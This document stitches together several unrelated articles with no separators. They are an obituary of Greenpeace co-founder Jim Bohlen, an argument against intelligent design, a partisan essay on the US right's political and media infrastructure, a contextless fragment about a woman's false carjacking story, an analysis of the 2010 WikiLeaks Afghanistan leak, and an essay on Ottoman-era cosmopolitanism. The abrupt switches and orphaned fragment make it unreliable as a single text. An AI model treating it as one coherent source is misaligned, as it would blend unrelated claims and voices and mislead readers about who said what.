zoom Do n't Make a Wave Committee members and Greenpeace founders ( from left ) Jim Bohlen , Paul Cote , and Irving Stowe .
Born in New York City in 1926 , Jim trained as a US naval radio operator .
After US navy service , he obtained an engineering degree and took a job with a defence contractor on Long Island , where he met famed engineer R. Buckminster Fuller .
Jim moved to Vancouver in the late 1960s when his second wife Marie ’s son became eligible for the military draft ; as Quakers , they were strongly opposed to US involvement in Vietnam .
One Saturday morning in the spring of 1968 , the Bohlens attended an anti-war demonstration on the lawn of the Provincial Court House .
Knowing almost nobody there , they looked for fellow Quakers among the maze of protestors , and introduced themselves to Irving and Dorothy Stowe .
The four soon became devoted friends , and were charter members of a new British Columbia chapter of the Sierra Club .
In 1969 , the US began testing nuclear weapons at Amchitka Island , Alaska .
The " Cannikin " test was scheduled for September 1971 .
Although some in the Sierra Club got cold feet about campaigning against the tests , Jim , Irving and law student Paul Cote formed the " Do n’t Make a Wave Committee " in November 1969 .
The Committee met at the Stowes ’ house to plan their protest against the Amchitka test , but the consensus process of the committee could often result in long debates and slow resolutions .
Jim was explaining his frustrations with this slow process to Marie one morning , when she casually asked why they did n’t simply sail a boat there .
At the same time , they received a telephone call from the Vancouver Sun , asking what campaigns they might be planning .
Caught off - guard , Jim said , " We hope to sail a boat to Amchitka to confront the bomb . "
The newspaper ran the story the following day .
Although Marie 's idea and Jim's " announcement " had bypassed the consensus process , nobody opposed the plan .
The Committee unanimously ratified the action , although at that time they had neither a boat nor the money to charter one .
Stowe organised a concert – which would feature Joni Mitchell , James Taylor , Phil Ochs and Chilliwack – to raise funds for a boat ; Bohlen , in the meantime , stumbled across one Captain John C. Cormack , skipper of the halibut seiner Phyllis Cormack .
Jim 's naval experience was one of the many reasons he was a leader aboard the Phyllis Cormack when it sailed towards Amchitka , ahead of the testing .
In a protest inspired by the Quaker movements practice of ' bearing witness ' the political furore caused by the group – which had now renamed itself Greenpeace – caused the test to be delayed .
The US would ultimately abandon its programme .
Jim continued to work with Greenpeace for several years , leaving when the organisation shifted its campaign focus to other issues .
When the 1980s saw a resurgence of Greenpeace campaigning against nuclear weapons he was involved once again , leading direct actions against cruise missile testing and participating in the Nuclear Free Seas campaign against nuclear weapons being brought into port cities aboard the warships of nuclear navies .
Jim retired to his home on Denman Island in 1987 .
A passionate ' green ' and ' peacenik , ' he continued to advocate renewable energy and agitate against nuclear power and nuclear weapons as a Green Party activist , standing as a candidate in the federal election of 1988 .
Jim is survived by his wife Marie , a stepson , a son and daughter by his first wife Anna , and a global environmental organisation .
The simple but serendipitous enthusiasm of Jim and Marie on the morning they told the Vancouver Sun they would be taking a boat to Amchitka was , arguably , the moment that Greenpeace was born .
The Case for a Creator , Closing Thoughts
The theory of evolution not only explains and unifies a vast range of scientific observations , it ’s given rise to an enormous , fruitful research program by predicting where we should look in order to find all kinds of phenomena of interest .
One of the most famous examples is how Charles Darwin predicted that the earliest human ancestors would be found in Africa , which turned out to be 100 % correct .
Based on observing flowers from Madagascar , Darwin also predicted the existence of a moth species with a startlingly long proboscis , and a moth matching his specifications was discovered .
Evolutionary theory led paleontologists to inspect rocks of a certain age in a certain location to find tetrapod ancestors , and lo and behold , we dug up Tiktaalik roseae .
Evolutionary theory enabled us to predict the likely characteristics of an ant ancestor , and we found a species preserved in amber that matched our expectations almost perfectly .
Evolutionary theory illuminated the similarities between birds and dinosaurs , and feathered theropods continue to turn up at a dizzying rate .
Even today , evolution continues to guide researchers who are expanding our knowledge of the human genome .
Because of evolution , we looked in yeast to find genes that build bodies , and we looked in sea cucumbers to find blood - clotting genes .
Because of evolution , we found viruses with similarities to crucial genes in our immune system , and bacteria with family ties to the mitochondria that power the metabolism of each and every cell in our bodies , and apes and monkeys whose vitamin C synthesis gene is broken in exactly the same way as ours .
Based on evolutionary reasoning , the first scientists to crack the genetic code worked under the assumption that it would be universal among life , and this too was correct .
These are bold , surprising predictions , which expand our knowledge of humanity even as they reveal our deep and intricate ties to the natural world .
And without the overarching assumption of evolution , there was no reason to suspect any of them to be true .
Yet they are true , and no other theory or hypothesis accounts for them so consistently and so well .
By letting the principles of evolution and the scientific method guide us , we ’ve enjoyed enormous success , and reaped the bounty of a rich harvest of knowledge about nature .
We ’ve also found no evidence whatsoever which confirms the existence of a supernatural creator .
And when some people are losing , it ’s little surprise that they want to change the rules of the game .
In chapter 9 , Stephen Meyer sums up his argument as follows :
“ Well , I say it ’s time to redefine science .
We should not be looking for only the best naturalistic explanation , but the best explanation , period .
And intelligent design is the explanation that ’s most in conformity with how the world works . ” [ p.243 ]
Please note the major concession : Strobel and his fellow - travelers are n’t doing science .
They ’re doing something else , and they want to “ redefine ” science so that the new definition can encompass whatever it is they are doing .
What ’s curious about this statement is that although Meyer calls for redefining science , he never says what he wants the new definition to be .
If they want to redefine science , how should the new definition differ from the old one ?
What activities will count as science that did n’t before ?
And once you conclude that “ design happened ” , then what ?
What predictions does the design hypothesis make about the structure of the world ?
Is there research that we can do to figure out the mindset , the abilities , the intentions of the designer ?
Can we know anything about him other than , perhaps , an inordinate fondness for beetles ?
If so , how ?
Neither Meyer nor any other advocate of ID has ever attempted to answer these questions .
If they ’re so eager to establish a new , non-natural kind of science , why do n’t they explain how it would work ?
More to the point , why do n’t they just go ahead and do it ?
They do n’t need anyone ’s permission .
If they could use their method to make verifiable predictions , they would n’t have to sit around trying to convince the rest of us .
There would be incontrovertible evidence of their success .
The proof is in the pudding , but Meyer , Strobel and the rest are offering us nothing but thin gruel .
They want us to discard the well - tested and massively successful framework of evolutionary theory and adopt their method instead , and promise vague but marvelous results at some unspecified future time .
They come to us empty - handed , having done none of the necessary work , and expect us to take their claims on faith – even though the Discovery Institute ’s sizable budget could easily support a well - equipped research division , and groups like the Templeton Foundation are openly seeking pro-ID research to fund .
Clearly , the only reason they ’re not doing science is because there ’s no science in their ideas to be done .
Like all creationists , they are intellectually bankrupt , and the “ redefinition ” they seek is to redefine scientific failure as scientific success .

The Right 's Power of Infrastructure Dwight Eisenhower , after commanding Allied forces in World War II and serving eight years as U.S. President , came to appreciate the power of political and economic infrastructure , leading to his famous warning about the threat to the American Republic from a “ military - industrial complex . ”

Yet , in the years since Eisenhower ’s Farewell Address in 1961 , the U.S. political system has allowed the “ military - industrial complex ” to continue growing and , indeed , to evolve into a sophisticated organism that collaborates with a supportive propaganda arm of think tanks , political apologists and media outlets , further distorting American democracy .
This infrastructure expanded sharply in the early 1980s when President Ronald Reagan secured a massive military buildup ( despite the fact that America ’s Soviet adversary was already crumbling ) and pushed for a “ pro-democracy ” apparatus using both public and private funds .
Though Reagan ’s “ democracy ” promotion ostensibly worked to undermine anti-U.S. governments abroad , the apparatus – ranging from the federal National Endowment for Democracy to the quasi- private Freedom House – became , in effect , a jobs program for neoconservatives , giving them a base of income , access and respectability within Official Washington .
Also , coinciding with Reagan ’s presidency was the construction of a right - wing media machine that propagated Reagan ’s political philosophy and attacked public figures , both in politics and in journalism , who refused to get in line .
In the three decades since Reagan came to power , this media machine has grown into one of the most feared forces in American political life .
Reagan ’s creation and expansion of these interlocking and self - interested institutions set the stage for the next explosive growth of the national security bureaucracy , after the 9/11 terror attacks .
Cheered on by influential neocons ( and think tanks ) and supported by the right - wing news media , President George W. Bush had no trouble erecting a new national security infrastructure that rose quickly from the already well - funded foundation of the U.S. intelligence community .
The expansion was dramatic .
In less than a decade , the estimated $ 30 billion a year intelligence budget more than doubled to $ 75 billion , a figure that does n’t count many related military and counter - terrorism operations .
Landmark Series
In a landmark investigative article , the Washington Post attempted to quantify this mind - numbing expansion .
According to Post reporters Dana Priest and William M. Arkin , this “ Top - Secret America ” represents “ an alternative geography of the United States ” with clusters of highly classified government agencies scattered around the country though concentrated most heavily in the Washington area .
The first article , entitled “ A hidden world , growing beyond control , ” highlighted the key findings : “ The top - secret world the government created in response to the terrorist attacks of Sept. 11 , 2001 , has become so large , so unwieldy and so secretive that no one knows how much money it costs , how many people it employs , how many programs exist within it or exactly how many agencies do the same work . …
“ After nine years of unprecedented spending and growth , the result is that the system put in place to keep the United States safe is so massive that its effectiveness is impossible to determine .
“ The investigation 's other findings include : “* Some 1,271 government organizations and 1,931 private companies work on programs related to counterterrorism , homeland security and intelligence in about 10,000 locations across the United States . “*
An estimated 854,000 people , nearly 1.5 times as many people as live in Washington , D.C. , hold top - secret security clearances . “*
In Washington and the surrounding area , 33 building complexes for top - secret intelligence work are under construction or have been built since September 2001 .
Together they occupy the equivalent of almost three Pentagons or 22 U.S. Capitol buildings - about 17 million square feet of space . “*
Many security and intelligence agencies do the same work , creating redundancy and waste .
For example , 51 federal organizations and military commands , operating in 15 U.S. cities , track the flow of money to and from terrorist networks .
“*
Analysts who make sense of documents and conversations obtained by foreign and domestic spying share their judgment by publishing 50,000 intelligence reports each year - a volume so large that many are routinely ignored . ”
In other words , President Bush launched a crash program to create a massive infrastructure dedicated to fighting the so - called Long War against Islamic militancy .
But the size of the endeavor was so vast and its construction so hasty and haphazard that it may not actually be adding to the national security .
But what this Top - Secret America is sure to do is to fight aggressively to maintain its jobs , money and power .
In that , it will be aided by its key allies in the complementary institutions of the old “ military - industrial complex , ” the neocon “ democracy ” infrastructure , and the right - wing media .
Other potent groups , such as the Republican Party and the Israel Lobby , will help , too .
Political / Media Asymmetry
The combination of these factors – especially when weighed against the relatively weak and severely underfunded counter - forces of America ’s progressives and independent media – suggests that a meaningful democracy may no longer exist in the United States .
Many on the Left have fumed about President Barack Obama ’s failure to reverse Bush ’s national security policies .
However , if one examines the relative power factors , it would probably amount to political suicide for Obama or any national leader to try to dismantle these interlocking infrastructures .
While the Right has worked diligently over the past several decades to strengthen its institutions and influence , the American Left has marginalized itself , choosing to possess no media outlets or think tanks that even come close to rivaling what the Right has in multiplicity .
For instance , wealthy progressives allowed the liberal talk - radio network Air America – a modest effort to balance the Right ’s enormous advantage in talk radio – to collapse this year .
Meanwhile , worthy Internet sites go begging , while the right - wingers keep adding and adding to their media assets .
( Further revealing the asymmetry of today ’s American media , right - wing Newsmax , run by conspiracy theorist Christopher Ruddy , has put in a bid to buy the Washington Post Co. ’s financially troubled Newsweek .
Though best known as an Internet site , Newsmax already publishes a national magazine . )
Besides the Left ’s benign neglect toward institutions needed to fight a “ war of ideas ” with the Right , there is also the cumulative impact of the ever - expanding military - intelligence - neocon arsenals that can level almost any political adversary who poses a significant threat .
“ Themes ” knocking down a political enemy can be put into play instantaneously and will quickly reverberate through the Right 's media echo chamber into the mainstream press .
Allied corporate interests also can now fund attack ads almost without restrictions , thanks to a ruling by the right - wing - dominated U.S. Supreme Court last January .
[ See Consortiumnews.com ’s “ Democracy ’s End of the Road . ” ]
On an individual level , fewer and fewer professionals in Washington will dare take on this fearsome complex of interlocking infrastructures , what might be called a new Iron Triangle comprised of wealthy military / intelligence contractors , neocon ideologues and right - wing media outlets .
Official Washington – both in media and politics – will become even more deaf to the needs of average Americans .
After all , a corollary to Eisenhower ’s “ military - industrial - complex ” warning could be Upton Sinclair ’s old truism that “ it is difficult to get a man to understand something , when his salary depends upon his not understanding it . ”
With so much money on one side and so little on the other , few professionals would be willing to put principles over their pocketbooks .
As noble as it might be to fight the good fight without resources , in the real world , that is simply a recipe for failure – especially when the other side has a war chest in the billions of dollars and growing by the day .

Meanwhile , Blasse called Goode 's brother to take her to a hospital .
Instead he took her to his home , where her parents collected her and drove her to South Jersey Healthcare Regional Medical Center in Vineland .
It was there she spun the carjacking and male prostitute stories for police , Laughlin said .
By George Friedman On Sunday , The New York Times and two other newspapers published summaries and excerpts of tens of thousands of documents leaked to a website known as WikiLeaks .
The documents comprise a vast array of material concerning the war in Afghanistan .
They range from tactical reports from small unit operations to broader strategic analyses of politico - military relations between the United States and Pakistan .
It appears to be an extraordinary collection .
Tactical intelligence on firefights is intermingled with reports on confrontations between senior U.S. and Pakistani officials in which lists of Pakistani operatives in Afghanistan are handed over to the Pakistanis .
Reports on the use of surface - to - air missiles by militants in Afghanistan are intermingled with reports on the activities of former Pakistani intelligence chief Lt. Gen.
Hamid Gul , who reportedly continues to liaise with the Afghan Taliban in an informal capacity .
The WikiLeaks
At first glance , it is difficult to imagine a single database in which such a diverse range of intelligence was stored , or the existence of a single individual cleared to see such diverse intelligence stored across multiple databases and able to collect , collate and transmit the intelligence without detection .
Intriguingly , all of what has been released so far has been not - so - sensitive material rated secret or below .
The Times reports that Gul 's name appears all over the documents , yet very few documents have been released in the current batch , and it is very hard to imagine intelligence on Gul and his organization , the Inter - Services Intelligence ( ISI ) directorate , being classified as only secret .
So , this was either low - grade material hyped by the media , or there is material reviewed by the selected newspapers but not yet made public .
Still , what was released and what the Times discussed is consistent with what most thought was happening in Afghanistan .
The obvious comparison is to the Pentagon Papers , commissioned by the Defense Department to gather lessons from the Vietnam War and leaked by Daniel Ellsberg to the Times during the Nixon administration .
Many people worked on the Pentagon Papers , each of whom was focused on part of it and few of whom would have had access to all of it .
Ellsberg did not give the Times the supporting documentation ; he gave it the finished product .
By contrast , in the WikiLeaks case , someone managed to access a lot of information that would seem to have been contained in many different places .
If this was an unauthorized leak , then it had to have involved a massive failure in security .
Certainly , the culprit should be known by now and his arrest should have been announced .
And certainly , the gathering of such diverse material in one place accessible to one or even a few people who could move it without detection is odd .
Like the Pentagon Papers , the WikiLeaks ( as I will call them ) elicited a great deal of feigned surprise , not real surprise .
Apart from the charge that the Johnson administration contrived the Gulf of Tonkin incident , much of what the Pentagon Papers contained was generally known .
Most striking about the Pentagon Papers was not how much surprising material they contained , but how little .
Certainly , they contradicted the official line on the war , but there were few , including supporters of the war , who were buying the official line anyway .
In the case of the WikiLeaks , what is revealed also is not far from what most people believed , although they provide enormous detail .
Nor is it that far from what government and military officials are saying about the war .
No one is saying the war is going well , though some say that given time it might go better .
The view of the Taliban as a capable fighting force is , of course , widespread .
If they were n't a capable fighting force , then the United States would not be having so much trouble defeating them .
The WikiLeaks seem to contain two strategically significant claims , however .
The first is that the Taliban are a more sophisticated fighting force than has been generally believed .
An example is the claim that Taliban fighters have used man-portable air defense systems ( MANPADS ) against U.S. aircraft .
This claim matters in a number of ways .
First , it indicates that the Taliban are using technologies similar to those used against the Soviets .
Second , it raises the question of where the Taliban are getting them — they certainly do n't manufacture MANPADS themselves .
If they have obtained advanced technologies , this would have significance on the battlefield .
For example , if reasonably modern MANPADS were to be deployed in numbers , the use of American airpower would either need to be further constrained or higher attrition rates accepted .
Thus far , only first - and second - generation MANPADS without Infrared Counter - Countermeasures ( which are more dangerous ) appear to have been encountered , and not with decisive or prohibitive effectiveness .
But in any event , this does n't change the fundamental character of the war .
Supply Lines and Sanctuaries
What it does raise is the question of supply lines and sanctuaries .
The most important charge contained in the leaks is about Pakistan .
The WikiLeaks contain documents that charge that the Pakistanis are providing both supplies and sanctuary to Taliban fighters while objecting to American forces entering Pakistan to clean out the sanctuaries and are unwilling or unable to carry out that operation by themselves ( as they have continued to do in North Waziristan ) .
Just as important , the documents charge that the ISI has continued to maintain liaison and support for the Taliban in spite of claims by the Pakistani government that pro-Taliban officers had been cleaned out of the ISI years ago .
The document charges that Gul , the director - general of the ISI from 1987 to 1989 , still operates in Pakistan , informally serving the ISI and helping give the ISI plausible deniability .
Though startling , the charge that Islamabad is protecting and sustaining forces fighting and killing Americans is not a new one .
When the United States halted operations in Afghanistan after the defeat of the Soviets in 1989 , U.S. policy was to turn over operations in Afghanistan to Pakistan .
U.S. strategy was to use Islamist militants to fight the Soviets and to use Pakistani liaisons through the ISI to supply and coordinate with them .
When the Soviets and Americans left Afghanistan , the ISI struggled to install a government composed of its allies until the Taliban took over Kabul in 1996 .
The ISI 's relationship with the Taliban — which in many ways are the heirs to the anti-Soviet mujahideen — is widely known .
In my book , " America 's Secret War , " I discussed both this issue and the role of Gul .
These documents claim that this relationship remains intact .
Apart from Pakistani denials , U.S. officials and military officers frequently made this charge off the record , and on the record occasionally .
The leaks on this score are interesting , but they will shock only those who did n't pay attention or who want to be shocked .
Let 's step back and consider the conflict dispassionately .
The United States forced the Taliban from power .
It never defeated the Taliban nor did it make a serious effort to do so , as that would require massive resources the United States does n't have .
Afghanistan is a secondary issue for the United States , especially since al Qaeda has established bases in a number of other countries , particularly Pakistan , making the occupation of Afghanistan irrelevant to fighting al Qaeda .
For Pakistan , however , Afghanistan is an area of fundamental strategic interest .
The region 's main ethnic group , the Pashtun , stretch across the Afghan - Pakistani border .
Moreover , were a hostile force present in Afghanistan , as one was during the Soviet occupation , Pakistan would face threats in the west as well as the challenge posed by India in the east .
For Pakistan , an Afghanistan under Pakistani influence or at least a benign Afghanistan is a matter of overriding strategic importance .
( click here to enlarge image )
It is therefore irrational to expect the Pakistanis to halt collaboration with the force that they expect to be a major part of the government of Afghanistan when the United States leaves .
The Pakistanis never expected the United States to maintain a presence in Afghanistan permanently .
They understood that Afghanistan was a means toward an end , and not an end in itself .
They understood this under George W. Bush .
They understand it even more clearly under Barack Obama , who made withdrawal a policy goal .
Given that they do n't expect the Taliban to be defeated , and given that they are not interested in chaos in Afghanistan , it follows that they will maintain close relations with and support for the Taliban .
Given that the United States is powerful and is Pakistan 's only lever against India , the Pakistanis will not make this their public policy , however .
The United States has thus created a situation in which the only rational policy for Pakistan is two - tiered , consisting of overt opposition to the Taliban and covert support for the Taliban .
This is duplicitous only if you close your eyes to the Pakistani reality , which the Americans never did .
There was ample evidence , as the WikiLeaks show , of covert ISI ties to the Taliban .
The Americans knew they could n't break those ties .
They settled for what support Pakistan could give them while constantly pressing them harder and harder until genuine fears in Washington emerged that Pakistan could destabilize altogether .
Since a stable Pakistan is more important to the United States than a victory in Afghanistan — which it was n't going to get anyway — the United States released pressure and increased aid .
If Pakistan collapsed , then India would be the sole regional power , not something the United States wants .
The WikiLeaks seem to show that like sausage - making , one should never look too closely at how wars are fought , particularly coalition warfare .
Even the strongest alliances , such as that between the United States and the United Kingdom in World War II , are fraught with deceit and dissension .
London was fighting to save its empire , an end Washington was hostile to ; much intrigue ensued .
The U.S. - Pakistani alliance is not nearly as trusting .
The United States is fighting to deny al Qaeda a base in Afghanistan while Pakistan is fighting to secure its western frontier and its internal stability .
These are very different ends that have very different levels of urgency .
The WikiLeaks portray a war in which the United States has a vastly insufficient force on the ground that is fighting a capable and dedicated enemy who is n't going anywhere .
The Taliban know that they win just by not being defeated , and they know that they wo n't be defeated .
The Americans are leaving , meaning the Taliban need only wait and prepare .
The Pakistanis also know that the Americans are leaving and that the Taliban or a coalition including the Taliban will be in charge of Afghanistan when the Americans leave .
They will make certain that they maintain good relations with the Taliban .
They will deny that they are doing this because they want no impediments to a good relationship with the United States before or after it leaves Afghanistan .
They need a patron to secure their interests against India .
Since the United States wants neither an India outside a balance of power nor China taking the role of Pakistan 's patron , it follows that the risk the United States will bear grudges is small .
And given that , the Pakistanis can live with Washington knowing that one Pakistani hand is helping the Americans while another helps the Taliban .
Power , interest and reality define the relations between nations , and different factions inside nations frequently have different agendas and work against each other .
The WikiLeaks , from what we have seen so far , detail power , interest and reality as we have known it .
They do not reveal a new reality .
Much will be made about the shocking truth that has been shown , which , as mentioned above , shocks only those who wish to be shocked .
The Afghan war is about an insufficient American and allied force fighting a capable enemy on its home ground and a Pakistan positioning itself for the inevitable outcome .
The WikiLeaks contain all the details .
We are left with the mystery of who compiled all of these documents and who had access to them with enough time and facilities to transmit them to the outside world in a blatant and sustained breach of protocol .
The image we have is of an unidentified individual or small group working to get a " shocking truth " out to the public , only the truth is not shocking — it is what was known all along in excruciating detail .
Who would want to detail a truth that is already known , with access to all this documentation and the ability to transmit it unimpeded ?
Whoever it proves to have been has just made the most powerful case yet for withdrawal from Afghanistan sooner rather than later .
Sectarian violence , ethnic conflict , religious politics , are all prominent features of the current situation in many Middle Eastern countries .
Thriving Jewish communities came to an end in every country after the inauguration of the state of Israel and the subsequent wars .
Christian communities , integral to the population and society of many countries , and prominent participants in the politics of Arab and regional nationalism , are now increasingly under pressure , and diminishing in numbers and importance in most countries , due to differential migration and fertility , and , in the case of Iraq , suffering violence and dislocation .
Ethnic and sectarian solidarities and conflicts are ever sharper , and the perennial Arab - Israeli quagmire takes on increasingly an ethno - religious garb .
A common theme in public discourse , in both the region and the West , is that these patterns of conflict have deep historical roots in the ‘ mosaic society ’ of the region , conflicts being only suppressed by imperial impositions , whether of the Ottomans or the British , and subsequently by violent dictatorships such as that of the Ba`th regimes .
When these are removed , as in the case of Iraq , then the deep - seated schisms are given a free reign and manifested in conflict and violence .
The opposite reaction comes from more liberal quarters of Middle Eastern as well as some Western commentators , who point to past periods of co-existence and harmony , as well as the lowering or even the erasure of communal barriers under the impact of modernity .
Many Iraqis , for instance , appear bewildered at the sharpening of Sunni - Shi`i conflict , and protest that in their days nobody knew or cared who was Sunni or Shi`i in their circles , and point to the many inter-marriages .
The current conflicts , then are explained in terms of imperialist manipulation , dictatorial rule and / or recent military interventions .
Where do we stand ?
The rise and fall of cosmopolitanism : a history
Let us start in late Ottoman times .
The great plurality of ethnicities , religions and social castes in the Empire , co-existed for the most part harmoniously ( not always ) , and in a hierarchy of status , but at a distance from each other and with strong communal barriers , exemplified by the so - called ‘ Millet system ’ of internal organisation and communal authorities .
Non-Muslim religious communities were recognised as corporate units with a degree of internal autonomy , regulating personal status and ritual issues and finances according to their religious law and custom , with state support for their communal authorities , often consisting of religious dignitaries .
Craft guilds , urban quarters , villages and tribal groups commonly constituted similar corporate units .
These communal barriers , however , were porous in many local instances and religion was more important than ethnicity .
The Tanzimat reforms of the mid-19th century , declaring , among other provisions , the equality before the law of all the subjects of the Sultan regardless of religion , led to a disturbance of the old equilibrium in different directions .
This disturbance was in addition to the longer term processes of the incorporation of the various regions into a world market and the effects of capitalist intrusions , which , on balance , favoured the non-Muslims , with their greater affinity with the increasingly dominant European interests .
Considerable resentment by Muslims in many parts led to conflict and violence in some instances , such as that of mid-Century Syria and Lebanon .
In the popular mind , international relations were conceived in communalist terms : European powers are Christian and in league with local Christians against Islam and Muslims .
This communalist model , with umma nationalism at its core has been revived in different forms in recent religious politics .
Nationalist and anti-imperialist ideology and advocacy commonly construe political and military confrontations , such as those in Afghanistan , Iraq and Palestine , as an attack on Muslims as such , by Christians ( ‘ Crusaders ’ ) , Jews and Hindus .
The complex geo-political issues involved are obscured or subordinated in favour of a spurious religious conception of the conflicts .
President Obama ’s conciliatory address to the ‘ Muslim world ’ seems to acquiesce in this formulation .
The project of the reform elites
The impacts of modernity and the Ottoman reforms had a different effect with regard to metropolitan elites .
The project of the reform elites , from the Young Ottomans in the 1860s to the Young Turks of the 1908 constitutional revolution , was to modernise the Empire into a quasi-nation state with common citizenship and constitutional government .
Given the plurality of ethnicities , languages and religions within this realm , this is what I am calling ‘ cosmopolitan citizenship ’ .
This project was enthusiastically embraced by the growing numbers of the modern metropolitan middle class , expanding with the bureaucracies , professions , modern business , the arts and the media .
Those were the inhabitants of the new public sphere and its venues of government departments , associations , schools and universities , the press , cafe society , and last but not least the new , respectable meyhanes and the symbolically important drinking culture , symbolising civilization , medeniyat .
An essential part of this outlook was a great interest and thirst for modern knowledge and idea , of science , rationality and positivism , and a critical stance in relation to religion , and for many a discreet rejection .
Some modern elites of the millets , the non-Muslim groups , participated in these ideas and associations .
Christian modern elites , in both Turkey and the Arab world , did not share the traditional , conservative outlook of their communal authorities and men of religion .
Those latter retained a millet orientation of maintaining communal boundaries while at the same time trying to be on the right side of the authorities and obtaining privileges and concessions .
Some Christian intellectuals converted from Catholic and Orthodox churches to Protestantism , and American missionaries were particularly effective in the Lebanon , participating in the Arab cultural ‘ renaissance ’ , including the foundation of the predecessor of the American University of Beirut .
Greeks , a vital constituent of the Ottoman mix from its foundation , were torn between different loyalties and outlooks .
The traditional millet and its Ottoman anchoring were centred on the Church and Patriarchate in Istanbul , more or less faithful to its Ottoman affiliations .
These were challenged by the more recent Greek nationalism and the Athens state , with an ideology of Hellenism and nationality , even with its own national , Athens , Church .
Yet others participated in the new Ottomanism and the idea of common citizenship .
At the level of the provincial communities , many of the Pontic Greeks of the Black Sea region spoke Turkish , and wrote it in Greek script .
They were surprised to be told , by teachers and missionaries from Greece , that they were part of a Hellenic nation with Athens as its capital .
1908
The height of consciousness of this Ottomanist citizenship came with the Young Turks revolution of 1908 .
The revolution was against the religious authoritarianism of Sultan Abdul - Hamid II ( r. 1876-1909 ) , which censored and suppressed reformist political ideas and associations , as well as secularist and positivist thought .
The modern intelligentsia , in their still flourishing print culture and clubs re-oriented their themes to science , literature and news , which escaped the censorship .
Hamidian religious revival , while not reversing reformist measures of equality in the Capital , led to many incidents of violence against Christians in the provinces , notably against Armenians in Anatolia , partly perpetrated by the Hamidiya brigades of Kurdish irregulars , preceding the greater massacres that were to follow in World War I .
The 1908 Revolution , then , was seen as an end to these tyrannies and a renewal of common Ottoman brotherhood among the different communities .
Demonstrations of Muslim - Christian friendship were held in many Ottoman cities , including Istanbul and Beirut .
In Istanbul Muslim religious personalities proceeded to Armenian cemeteries to lay flowers on the graves of victims of earlier violence .
Masonic lodges
An important venue for this Ottoman cosmopolitanism were the Masonic lodges .
Ottoman Muslims were admitted into these lodges in the 1860s and many intellectuals and public figures embraced Masonry with enthusiasm .
The lodges they favoured followed the French Grand Orient , which , unlike its British counterparts , jettisoned the references to a Supreme Being , and the Immortality of the Soul , the deistic principle of earlier Masonry .
It also embraced the slogan of the French Revolution of Equality , Liberty and Fraternity ( to which the later Young Turks added Justice ) .
In effect , those lodges favoured secular positivism and rationality , which was part of its attraction to Ottoman liberals .
Membership included Greeks , Armenians and Jews , as well as European residents .
Turkish was introduced as one of the languages of proceeding in some lodges .
Many Ottoman intellectuals combined Masonry and positivism with heterodox Muslim mysticism , notably Bektashism , a historic Turkish Sufi order , outlawed in the 1820s and organised in secret societies .
Ibn Arabi ( 1165 -1240 ) , the main reference of Muslim mysticism , was embraced alongside Herbert Spencer and Auguste Comte .
What the two strands had in common was the rejection of religious authority and institutions .
Masonry was equally prevalent in Egypt , where the Muslim reformer Jamal - ad - Din Al - Afghani ( 1838 -1897 ) was the master of a lodge , which also embraced some of his followers , including Muhammad Abdu ( 1849-1905 ) .
It played an important part in the politics of the elites .
The Iraqi poet , Ma`ruf al - Rusafi ( d.1945 ) was recruited into a lodge when in Istanbul , but renounced that affiliation in statements in later life as an Iraqi and Arab nationalist .
The conspiracy which culminated in the Young Turk revolution of 1908 took place within the Italian Masonic lodge in Salonica .
The legal immunities of the foreigners and their homes in that city offered protection for the military conspirators from Hamidian police and spies .
In 1909 there was a counter - revolution in Istanbul , in support of the Sultan and the Islamic shari`a , led by religious figures .
This was put down by army contingents from Salonica , and culminated in the deposition of the Sultan .
The four member delegation which went to the Palace to inform Abdul - Hamid of his deposition were all from minority communities , including the Jew Emmanuel Karasso , a prominent Mason .
Of course this fed into later conspiracy theories about Masons and Jews plotting to end the last Islamic caliphate .
Karasso , in fact , was an Ottomanist , and explicitly rejected Zionist claims .
The heady days of the Constitution and Ottoman renaissance soon gave way to the many problems of the Empire , of bankruptcy and military vulnerability , as well as factional struggles between different factions and personalities of the Young Turks and their opponents .
The wars that followed , in Tripoli against the Italians , then the Balkan wars , and ultimately WWI , all contributed to the sharpening of nationalist , religious and ethnic conflicts , militating against the brief flourishing of the ideas of cosmopolitan citizenship .
Muslim refugees from the Balkans and Caucasus ( all labelled Turks by their European persecutors ) poured into Turkey and fuelled communal and religious antagonism .
Then the Armenian massacres in Anatolia in 1915 , then the defeat in WWI , the war of national liberation and against the Greeks , then the exchange of populations with Greece .
The Turkish Republic emerged , secular , but with a population consisting mainly of Sunni Muslims , largely ‘ cleansed ’ of the non-Muslim communities of Armenians and Greeks .
The conflicts that followed were mainly against the ethnic Kurds , and to a lesser extent the ‘ heretical ’
Alevis .
The demise of empire
The break - up of Empire and the participation of some Arab forces , ideologically and militarily , in its demise , sharpened various forms of Arab nationalism and country nationalisms .
The colonial and Mandate regimes that followed in some countries reinforced these nationalist sentiments .
However , the traces of cosmopolitan or , now , pluralist citizenship , continued under new conditions , at least with some of the intellectuals and notables .
Only , the pluralism was displaced from the Ottoman to the diversity of religion and ethnicity in the new countries .
Those successor states were designated by territory and ethnicity , such as Iraq and Arab , with rival nationalist ideologies playing on these distinctions .
Within each state territory , however , there was a multiplicity of ethnicities and religions , some of which sat uneasily with the nationalist designations .
Liberal and leftist orientations adopted civic and territorial inclusive conceptions of the nation , which accommodated and welcomed the diversity , as against the exclusive ethnic and religious definitions .
Let me illustrate with the example of the two most prominent poets of Iraq in its formative years , Jamil Sidqi al - Zahawi ( 1863-1936 ) and Ma`ruf al - Rusafi .
Both these were Ottoman in their formation and early career .
They spent many years in Istanbul , became enthusiastic supporters of the Committee of Union and Progress ( the Young Turks ) and both were elected members of the Ottoman parliament for Iraqi constituencies .
Zahawi continued to support the Ottomans during WWI , wrote poems to that effect , including one eulogising Enver Pasha , the strong man of the Unionist ( Young Turk ) government , and alleged perpetrator of the Armenian massacres .
After the War , Zahawi changed his tune : he wrote in praise of the English and their superiority over the Turks , and served on educational and media organisations of the Mandate .
He even inserted poems into his collection , backdated to the War years , attacking Jamal Pasha , wartime Wali of Damascus who hanged Arab patriots .
All this can be seen as straightforward political opportunism .
Yet , Zahawi ’s distance from religion , his commitments to social reform , science and rationality , and above all to the liberation of women , for which he was frequently attacked and , on one occasion , lost his job , continued .
His support for the English can be seen as part of that commitment to the project of reform , which he first sought from the Ottoman reformers , then from the European colonial power .
Rusafi , more impulsive and bohemian in his life - style , changed to an Iraqi nationalism , opposed to the British and the Monarchy .
He too continued his commitment to reform , and while protesting his faith in Islam , was hostile and contemptuous to the official ulama and what he saw as their reaction .
Both were committed to a pluralist Iraq ( both were of Kurdish parentage , though not affiliation ) .
They championed Christian and Jewish equality , and had friends and colleagues from these groups .
